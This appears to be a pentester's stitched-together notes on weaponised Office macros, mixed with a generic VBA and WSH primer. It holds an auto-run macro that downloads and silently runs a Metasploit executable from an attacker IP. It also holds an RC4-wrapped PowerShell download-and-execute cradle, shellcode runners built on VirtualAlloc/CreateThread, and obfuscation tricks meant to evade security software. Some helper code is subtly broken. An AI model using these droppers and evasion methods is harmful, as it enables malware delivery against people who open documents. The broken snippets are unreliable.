- VB Command Reference: https://ss64.com/vb/
- JScript: https://learn.microsoft.com/en-us/dotnet/api/microsoft.jscript?view=netframework-4.8.1

### Download and save to path

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.185/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim pwd As String
    pwd = GetCurrentDirectory()
    Dim exePath As String
    exePath = pwd + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

Function GetCurrentDirectory() As String
    Dim wsh As Object
    Dim cmd As String
    Dim exec As Object
    Dim output As String
    Dim cd As String
    
    Set wsh = CreateObject("WScript.Shell")
    cmd = "cmd.exe /c echo %cd%"
    Set exec = wsh.exec(cmd)
    output = exec.StdOut.ReadAll
    cd = Replace(output, vbCr, "")
    cd = Replace(cd, vbLf, "")
    
    GetCurrentDirectory = cd
    
    Set exec = Nothing
    Set wsh = Nothing
End Function

```

### RC4 Encryption example

```vb
Function RC4ByteArray(key() As Byte, data() As Byte) As Byte()
    Dim S(255) As Integer
    Dim t(255) As Integer
    Dim i As Integer, j As Integer, l As Integer
    
    Dim temp As Integer
    Dim keystream As Integer
    Dim k As Long
    Dim dataLength As Long
    Dim output() As Byte
    
    dataLength = UBound(data) - LBound(data) + 1
    ReDim output(LBound(data) To UBound(data))
    
    ' Initialize S and T
    For i = 0 To 255
        S(i) = i
        t(i) = key(i Mod (UBound(key) - LBound(key) + 1)) ' Key Scheduling
    Next i
    
    ' Initial permutation of S
    j = 0
    For i = 0 To 255
        j = (j + S(i) + t(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
    Next i
    
    ' Perform the encryption/decryption
    i = 0
    j = 0
    
    For k = LBound(data) To UBound(data)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
        l = (S(i) + S(j)) Mod 256
        keystream = S(l)
        output(k) = data(k) Xor keystream
    Next k
    
    RC4ByteArray = output
End Function

Sub TestRC4Macro()
    Dim key As String
    Dim plaintext As String
    Dim ciphertext() As Byte
    Dim decrypted() As Byte
    Dim keyBytes() As Byte
    Dim plaintextBytes() As Byte
    
    ' Example key and plaintext
    key = "mysecretkey"
    plaintext = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    
    ' Convert key and plaintext to byte arrays
    keyBytes = StrConv(key, vbFromUnicode)
    plaintextBytes = StrConv(plaintext, vbFromUnicode)
    
    ' Encrypt the plaintext
    ciphertext = RC4ByteArray(keyBytes, plaintextBytes)
    
    ' Print ciphertext as hex string
    Dim i As Integer
    Dim hexStr As String
    For i = LBound(ciphertext) To UBound(ciphertext)
        hexStr = hexStr & Right("00" & Hex(ciphertext(i)), 2)
    Next i
    Debug.Print "Ciphertext (hex): " & hexStr
    
    ' Decrypt the ciphertext
    decrypted = RC4ByteArray(keyBytes, ciphertext)
    
    ' Convert decrypted byte array back to string
    Dim decryptedText As String
    decryptedText = StrConv(decrypted, vbUnicode)
    
    Debug.Print "Decrypted: " & decryptedText

End Sub

```


### VBA (Visual Basic for Applications) Primer

**VBA (Visual Basic for Applications)** is a programming language developed by Microsoft that is primarily used for automating tasks and creating custom functions in Microsoft Office applications like **Word**, **Excel**, **Access**, and **Outlook**. VBA allows users to write macros, which are sequences of instructions to automate repetitive tasks.

### Overview of VBA in Word and Excel

- **Excel VBA**: Primarily used for automating data manipulation, creating custom functions, and controlling Excel features (e.g., modifying worksheets, formatting cells).
- **Word VBA**: Used for automating document formatting, creating templates, or manipulating text, tables, and other objects in Word documents.

---

### **VBA Basics**

#### **1. The Developer Tab**
To create or run a macro in Word or Excel, you first need to enable the **Developer Tab**:
1. **Excel/Word** → **File** → **Options** → **Customize Ribbon**.
2. Check the box next to **Developer**.
3. Click **OK**.

#### **2. Writing VBA Code (VBA Editor)**
- Press **Alt + F11** to open the **VBA Editor**.
- In the VBA editor, you can insert modules where you'll write your VBA code:
  - **Excel**: Modules contain macros that manipulate worksheets, cells, and ranges.
  - **Word**: Modules contain macros that manipulate text, paragraphs, tables, and other elements of the document.

#### **3. Basic Structure of a VBA Macro**
A simple VBA macro consists of **subroutines** or **functions**. Here’s a basic example of a **Sub procedure**:

```vba
Sub MyFirstMacro()
    ' Display a message box
    MsgBox "Hello, VBA!"
End Sub
```

- **Sub**: Defines the start of the macro.
- **MsgBox**: Displays a message box with the text "Hello, VBA!".
- **End Sub**: Ends the procedure.

---

### **VBA in Excel**

#### **1. Automating Tasks with Excel**

##### **Selecting and Modifying Cells**
VBA is often used in Excel to automate tasks like selecting and modifying cell values.

```vba
Sub ModifyCells()
    ' Select a range of cells
    Range("A1:B5").Select
    
    ' Modify the value of a specific cell
    Range("A1").Value = "Hello, Excel!"
End Sub
```

##### **Looping Through a Range**
You can loop through cells in a range and perform operations on each one.

```vba
Sub LoopThroughCells()
    Dim cell As Range
    For Each cell In Range("A1:A10")
        cell.Value = "Test"
    Next cell
End Sub
```

##### **Using Variables in Excel VBA**
You can store values in variables and manipulate them.

```vba
Sub CalculateSum()
    Dim num1 As Integer
    Dim num2 As Integer
    Dim total As Integer
    
    num1 = Range("A1").Value
    num2 = Range("A2").Value
    total = num1 + num2
    
    MsgBox "The sum is " & total
End Sub
```

#### **2. Events in Excel**
Excel has a range of **event-driven programming** features, allowing you to trigger macros automatically when certain events happen (e.g., when a workbook opens, or a cell changes).

```vba
Private Sub Workbook_Open()
    MsgBox "Welcome to the workbook!"
End Sub
```

- **Workbook_Open**: Runs automatically when the workbook is opened.
- Similarly, there are events like **Workbook_SheetChange** and **Worksheet_Activate** for more granular control.

---

### **VBA in Word**

#### **1. Automating Text Manipulation in Word**

##### **Inserting Text**
In Word, you can use VBA to insert text at specific locations, such as in a range or at the end of a document.

```vba
Sub InsertText()
    ' Insert text at the current selection point
    Selection.TypeText "This is some text."
    
    ' Insert text at the end of the document
    With ActiveDocument.Content
        .InsertAfter "This is the end of the document."
    End With
End Sub
```

##### **Formatting Text**
You can use VBA to format text, such as changing font size, making text bold, or applying styles.

```vba
Sub FormatText()
    ' Select the first paragraph
    ActiveDocument.Paragraphs(1).Range.Select
    
    ' Apply formatting
    With Selection.Font
        .Bold = True
        .Size = 14
        .Name = "Arial"
    End With
End Sub
```

#### **2. Working with Tables in Word**
You can create, modify, and format tables using VBA in Word.

```vba
Sub CreateTable()
    ' Insert a 2x3 table
    Dim myTable As Table
    Set myTable = ActiveDocument.Tables.Add(Range:=Selection.Range, NumRows:=2, NumColumns:=3)
    
    ' Add text to the first cell
    myTable.Cell(1, 1).Range.Text = "Hello, Word!"
End Sub
```

#### **3. Working with Documents and Templates**
You can create and save Word documents, as well as apply templates using VBA.

```vba
Sub CreateNewDocument()
    ' Create a new document
    Dim newDoc As Document
    Set newDoc = Documents.Add
    
    ' Add some text to the new document
    newDoc.Content.InsertAfter "This is a new document."
    
    ' Save the document
    newDoc.SaveAs2 "C:\path\to\your\newdocument.docx"
End Sub
```

---

### **VBA Control Structures**

#### **1. Conditional Statements**
You can use **If...Then...Else** to perform conditional logic in VBA.

```vba
Sub CheckValue()
    Dim cellValue As Integer
    cellValue = Range("A1").Value
    
    If cellValue > 10 Then
        MsgBox "Value is greater than 10."
    Else
        MsgBox "Value is 10 or less."
    End If
End Sub
```

#### **2. Loops**
Loops help you automate repetitive tasks like processing each row in a spreadsheet or paragraph in a Word document.

- **For Loop**:
```vba
Sub ForLoopExample()
    Dim i As Integer
    For i = 1 To 10
        Cells(i, 1).Value = i
    Next i
End Sub
```

- **Do While Loop**:
```vba
Sub DoWhileExample()
    Dim i As Integer
    i = 1
    Do While i <= 10
        Cells(i, 1).Value = i
        i = i + 1
    Loop
End Sub
```

---

### **Important VBA Objects and Concepts**

#### **1. The `Application` Object**
Represents the entire Excel or Word application.

- **Excel**: 
```vba
Application.ScreenUpdating = False ' Disables screen updates to improve performance.
```

- **Word**: 
```vba
Application.Quit ' Closes Word
```

#### **2. The `Range` Object (Excel)**
Represents a range of cells in a worksheet.

```vba
Range("A1:B5").Value = "Hello!" ' Assigns values to a range of cells.
```

#### **3. The `Selection` Object (Word)**
Represents the current selection in a Word document.

```vba
Selection.TypeText "This text will be inserted at the current cursor location."
```

#### **4. The `Worksheet` and `Workbook` Objects (Excel)**
- **Workbook**: Represents an entire Excel workbook.
```vba
Workbooks.Add ' Creates a new workbook.
```
- **Worksheet**: Represents an individual worksheet in Excel.
```vba
Worksheets("Sheet1").Activate ' Activates a worksheet by name.
```

---

### **Debugging and Error Handling in VBA**

#### **1. Message Boxes**
Use `MsgBox` for debugging purposes.

```vba
MsgBox "The value is: " & Range("A1").Value
```

#### **2. Error Handling**
To prevent runtime errors from stopping your macro, use **error handling** with `On Error` statements.

```vba
Sub SafeMacro()
    On Error GoTo ErrorHandler
    ' Your macro code here

    Exit Sub
    
ErrorHandler:
    MsgBox "An error occurred: " & Err.Description
End Sub
```

---

### **Macros in Word and Excel**

#### **Creating a Macro in Word or Excel**
1. Go to the **Developer Tab**.
2. Click **Record Macro**.
3. Perform the actions you want to automate (e.g., formatting, adding text).
4. Click **Stop Recording**.
5. Open the VBA editor (`Alt + F11`) to view or edit the macro.

#### **Running a Macro**
1. Press **Alt + F8** to open the "Macro" dialog box.
2. Select the macro from the list.
3. Click **Run**.

---

### **Security Concerns in VBA**
- **Macro Viruses**: Macros can be used for malicious purposes, such as distributing malware. It’s important to avoid running untrusted macros.
- **Security Settings**: In Word/Excel, you can control macro security settings to enable/disable macros or only allow signed macros.

To adjust macro security:
- **File → Options → Trust Center → Trust Center Settings → Macro Settings**.

---

Executing shellcode in Word macros, especially through VBA, can be highly dangerous and is often associated with malware. However, from a technical perspective, I'll provide a basic understanding of how shellcode execution can occur in Word macros using VBA and PowerShell, along with obfuscation techniques.

**Warning**: This information should only be used for ethical purposes, such as penetration testing in controlled environments or research. Improper use could lead to malicious outcomes.

### 1. **Basic Shellcode Execution in a Word Macro (VBA)**

In this example, we’ll demonstrate the basic steps required to load shellcode from a VBA macro in Word and execute it. This involves calling Windows API functions like `VirtualAlloc`, `RtlMoveMemory`, and `CreateThread`.

#### **VBA Macro: Execute Shellcode**

```vba
Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lpDestination As LongPtr, ByVal lpSource As LongPtr, ByVal Length As Long) As Long
Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr

Sub RunShellcode()
    ' Simple shellcode (calc.exe example for demonstration)
    Dim shellcode As String
    shellcode = _
        "fc4883e4f0e8c0000000415141505251564831d2" & _
        "65488b5260488b5218488b5220488b725048ad48" ' (Example shellcode)

    Dim scBytes() As Byte
    Dim shellcodeLength As Long
    shellcodeLength = Len(shellcode) \ 2
    ReDim scBytes(0 To shellcodeLength - 1)

    Dim i As Long
    For i = 1 To Len(shellcode) Step 2
        scBytes((i - 1) \ 2) = CByte("&H" & Mid(shellcode, i, 2))
    Next i

    ' Allocate memory for shellcode
    Dim addr As LongPtr
    addr = VirtualAlloc(0, shellcodeLength, &H1000 Or &H2000, &H40) ' MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

    ' Move shellcode into allocated memory
    Call RtlMoveMemory(addr, VarPtr(scBytes(0)), shellcodeLength)

    ' Create a thread to execute the shellcode
    Call CreateThread(0, 0, addr, 0, 0, 0)
End Sub
```

- **Explanation**:
  - **`VirtualAlloc`**: Allocates executable memory for the shellcode.
  - **`RtlMoveMemory`**: Moves the shellcode into the allocated memory.
  - **`CreateThread`**: Starts a new thread to execute the shellcode.
  
**Note**: This example shellcode is simplified for educational purposes. Actual shellcode can vary depending on the intended payload.

### 2. **Executing Shellcode via PowerShell from VBA**

VBA macros can also invoke PowerShell commands to execute shellcode. This technique leverages PowerShell’s ability to run dynamic content.

#### **VBA Macro: PowerShell Shellcode Execution**

```vba
Sub RunShellcodeWithPowerShell()
    Dim shellcode As String
    shellcode = "[Byte[]] $sc = 0xfc,0x48,0x83,0xe4,0xf0; " & _
                "$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length); " & _
                "[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length); " & _
                "$t = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Func[System.IntPtr]]); " & _
                "$t.Invoke()"

    ' Construct the PowerShell command
    Dim cmd As String
    cmd = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & Chr(34) & shellcode & Chr(34)

    ' Run PowerShell with shellcode
    Shell cmd, vbHide
End Sub
```

- **Explanation**:
  - Shellcode is passed as a string of bytes to PowerShell.
  - PowerShell allocates memory using `[System.Runtime.InteropServices.Marshal]` and copies the shellcode into that allocated memory.
  - The shellcode is then executed using a delegate via `GetDelegateForFunctionPointer()`.

### 3. **Obfuscation Techniques**

Obfuscating macros makes it harder for security software to detect malicious actions. Below are a few techniques to obfuscate the VBA macro and PowerShell command.

#### **Obfuscating the VBA Macro**

1. **String Splitting**: Break strings into smaller parts.
```vba
Dim part1 As String, part2 As String
part1 = "calc"
part2 = ".exe"
Shell part1 & part2
```

2. **Base64 Encoding Shellcode**: Encode shellcode and decode it at runtime.
```vba
Sub RunEncodedShellcode()
    Dim encodedShellcode As String
    encodedShellcode = "QWxsb2MgSExHTEcgZm9yIHNoZWxsY29kZQ==" ' Example base64-encoded string
    Dim decodedShellcode() As Byte
    decodedShellcode = Base64Decode(encodedShellcode)
    ' ... Use decoded shellcode
End Sub

Function Base64Decode(base64 As String) As Byte()
    Dim xml As Object
    Set xml = CreateObject("MSXml2.DOMDocument.3.0")
    xml.LoadXML "<b64>" & base64 & "</b64>"
    Base64Decode = xml.DocumentElement.nodeTypedValue
End Function
```

#### **Obfuscating the PowerShell Command**

1. **Base64 Encode PowerShell Command**: Use Base64 encoding to hide the actual command.
```vba
Sub RunObfuscatedPowerShell()
    Dim psCommand As String
    psCommand = "[Byte[]] $sc = 0xfc,0x48,...; $mem = ..."
    
    ' Base64 encode the PowerShell command
    Dim base64Command As String
    base64Command = EncodeBase64(psCommand)

    ' Run PowerShell with Base64-encoded command
    Dim cmd As String
    cmd = "powershell -EncodedCommand " & base64Command
    Shell cmd, vbHide
End Sub

Function EncodeBase64(text As String) As String
    Dim bytes() As Byte
    bytes = StrConv(text, vbFromUnicode)
    Dim xml As Object
    Set xml = CreateObject("MSXml2.DOMDocument.3.0")
    xml.LoadXML "<b64>" & bytes & "</b64>"
    EncodeBase64 = xml.DocumentElement.nodeTypedValue
End Function
```

2. **String Concatenation and Variable Substitution**: Break up keywords and PowerShell commands to avoid detection.
```vba
Sub RunSplitPowerShellCommand()
    Dim part1 As String, part2 As String, part3 As String
    part1 = "pow"
    part2 = "ers"
    part3 = "hell -ExecutionPolicy Bypass -NoProfile -Command calc.exe"

    Shell part1 & part2 & part3, vbHide
End Sub
```

### 4. **Other Obfuscation Techniques**

- **Hexadecimal Encoding**: Encode all strings (like shellcode) in hexadecimal format and decode them during execution.
- **Control Flow Obfuscation**: Use meaningless jumps, loops, or `Goto` statements to confuse static code analysis.
- **Variable Renaming**: Use nonsensical variable names to hinder readability of the script.
  
Example:
```vba
Dim a As String
a = "calc.exe"
Shell a
```

---

Using **shell commands** or **WSH (Windows Script Host)** commands within scripts can be very useful for automating tasks, running external programs, or interacting with system components. Below are examples of both approaches, along with how they might be used in VBA macros, batch scripts, or standalone WSH scripts (VBS, JS).

---

### **1. Shell Commands in VBA**

VBA allows you to execute shell commands using the `Shell` function or the `WScript.Shell` object. Here are some examples:

#### **Using the `Shell` function in VBA**
The `Shell` function executes a program or command in a separate process.

```vba
Sub RunShellCommand()
    ' Run the Windows "calc.exe" application
    Shell "calc.exe", vbNormalFocus
End Sub
```

#### **Running a PowerShell Command from VBA**
You can execute PowerShell scripts or commands via the `Shell` function in VBA.

```vba
Sub RunPowerShellCommand()
    Dim psCommand As String
    psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command ""Get-Process | Out-File C:\temp\processes.txt"""
    
    ' Run the PowerShell command
    Shell psCommand, vbHide
End Sub
```

#### **Using `WScript.Shell` for More Advanced Control**
With `WScript.Shell`, you can run external programs and capture their output.

```vba
Sub RunShellWithWSH()
    Dim shellObj As Object
    Set shellObj = CreateObject("WScript.Shell")
    
    ' Run a command and wait for it to complete
    shellObj.Run "cmd.exe /c dir C:\ > C:\temp\dirlist.txt", 0, True
End Sub
```

---

### **2. Using WSCRIPT (Windows Script Host) with VBScript**

**WSH** allows you to run VBScript or JScript code directly in Windows without the need for a browser or external IDE. WSH scripts can use objects like `WScript.Shell` to run external commands and automate tasks.

#### **Simple VBScript Shell Example (dir command)**

```vbscript
' Save this as script.vbs and run it using wscript.exe or cscript.exe
Dim objShell
Set objShell = CreateObject("WScript.Shell")

' Run a shell command
objShell.Run "cmd.exe /c dir C:\", 1, True
```

- **Explanation**: The above VBScript runs a `dir` command to list the contents of the `C:\` drive. The `1` specifies to show the command window, and `True` tells the script to wait for the command to complete before continuing.

#### **Executing PowerShell from VBScript**

You can use **VBScript** to run **PowerShell** commands as well:

```vbscript
Dim objShell
Set objShell = CreateObject("WScript.Shell")

' Run a PowerShell script using WSH
objShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""Get-Process | Out-File C:\temp\processes.txt""", 0, True
```

#### **Reading Environment Variables Using VBScript**

You can access environment variables in VBScript using `WScript.Shell`:

```vbscript
Dim shell, userName
Set shell = CreateObject("WScript.Shell")

' Get the username from the environment variables
userName = shell.ExpandEnvironmentStrings("%USERNAME%")

WScript.Echo "Logged in user: " & userName
```

#### **Creating Shortcuts with WSH (VBScript Example)**

```vbscript
Dim shellObj, shortcut
Set shellObj = CreateObject("WScript.Shell")

' Create a shortcut to Notepad on the desktop
Set shortcut = shellObj.CreateShortcut(shellObj.SpecialFolders("Desktop") & "\Notepad.lnk")
shortcut.TargetPath = "C:\Windows\notepad.exe"
shortcut.Save

WScript.Echo "Shortcut created!"
```

---

### **3. Using WSCRIPT (Windows Script Host) with JScript**

JScript (JavaScript for WSH) can also be used for automating tasks, running shell commands, or interacting with the file system.

#### **Simple JScript Shell Example**

```javascript
var shell = WScript.CreateObject("WScript.Shell");
shell.Run("notepad.exe");
```

#### **Executing Command Line Utilities with JScript**

```javascript
var shell = WScript.CreateObject("WScript.Shell");

// Run the "ipconfig" command and output the results
shell.Run("cmd.exe /c ipconfig > C:\\temp\\ipconfig.txt", 0, true);
```

#### **Reading Registry Values with JScript**

```javascript
var shell = WScript.CreateObject("WScript.Shell");

// Read a registry value
var regValue = shell.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive");
WScript.Echo("Registry value: " + regValue);
```

#### **Opening Websites with WSH in JScript**

```javascript
var shell = WScript.CreateObject("WScript.Shell");

// Open a URL in the default web browser
shell.Run("https://www.example.com");
```

---

### **4. Shell Commands in Batch Files**

Windows batch scripts can also use shell commands to automate tasks. Here are some common examples:

#### **Running a PowerShell Command in a Batch File**

```batch
@echo off
powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-Process | Out-File C:\temp\processes.txt"
```

#### **Batch File: Running External Programs**

```batch
@echo off
echo Running Notepad...
start notepad.exe
```

#### **Running a VBScript from a Batch File**

```batch
@echo off
cscript //nologo script.vbs
```

---

### **5. Obfuscation Techniques for Shell or WSH Commands**

Obfuscation techniques are often used to hide the real intent of the script or command. However, they should be used ethically, such as for penetration testing or research purposes.

#### **String Concatenation Obfuscation**

By splitting the command into parts, it becomes more difficult for simple pattern-matching detection tools to identify the command:

**VBA Example**:
```vba
Sub ObfuscatedCommand()
    Dim cmd As String
    cmd = "pow" & "ersh" & "ell -ExecutionPolicy Bypass -NoProfile -Command calc.exe"
    Shell cmd, vbHide
End Sub
```

**VBScript Example**:
```vbscript
Dim shell, cmd
Set shell = CreateObject("WScript.Shell")
cmd = "cmd.exe /c " & "dir C:\" ' Command is split up to avoid detection
shell.Run cmd
```

#### **Base64 Encoding (PowerShell)**

Encoding commands in Base64 is a common way to obfuscate PowerShell commands:

```vba
Sub EncodedPowerShell()
    Dim base64Command As String
    base64Command = "cG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtTm9Qcm9maWxlIC1Db21tYW5kIGNhbGMuZXhl"

    ' Execute the Base64-encoded PowerShell command
    Shell "powershell -EncodedCommand " & base64Command, vbHide
End Sub
```

- **Explanation**: The Base64 string decodes to `"powershell -ExecutionPolicy Bypass -NoProfile -Command calc.exe"`. The PowerShell `-EncodedCommand` parameter executes this Base64-encoded command.

---

### **6. Running WSCRIPT Commands in Batch**

You can call a VBScript or JScript using `wscript.exe` or `cscript.exe` from a batch file. This allows you to combine the power of batch scripts and WSH.

**Batch File Example**:
```batch
@echo off
wscript script.vbs
```

**VBScript (`script.vbs`) Example**:
```vbscript
WScript.Echo "This is a message from VBScript!"
```

---

### Conclusion

Both **shell commands** and **WSH scripts** (using VBScript or JScript) are powerful tools for automating tasks in Windows environments. They allow you to interact with the file system, registry, and external programs with ease. Obfuscation techniques, like string concatenation and Base64 encoding, can make it harder to detect or analyze the intent of a script, but should only be used for ethical purposes.

